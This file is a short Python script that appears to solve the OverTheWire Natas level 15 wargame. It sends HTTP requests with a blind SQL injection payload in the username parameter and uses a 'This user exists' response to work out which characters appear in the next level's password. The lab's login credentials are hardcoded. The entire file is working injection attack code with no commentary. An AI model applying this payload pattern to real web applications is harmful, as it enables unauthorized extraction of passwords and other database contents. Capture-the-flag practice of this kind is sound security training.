import requests

target = 'http://natas15.natas.labs.overthewire.org'
charset_0 = (
	'0123456789' +
	'abcdefghijklmnopqrstuvwxyz' +
	'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
)
charset_1 = ''

for c in charset_0:
	username = ('natas16" AND password LIKE BINARY "%' + c +'%" "')
	r = requests.get(target,
		auth=('natas15','TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'),
		params={"username": username}
	)
	if "This user exists" in r.text:
		charset_1 += c
		print ('CSET: ' + charset_1.ljust(len(charset_0), '*'))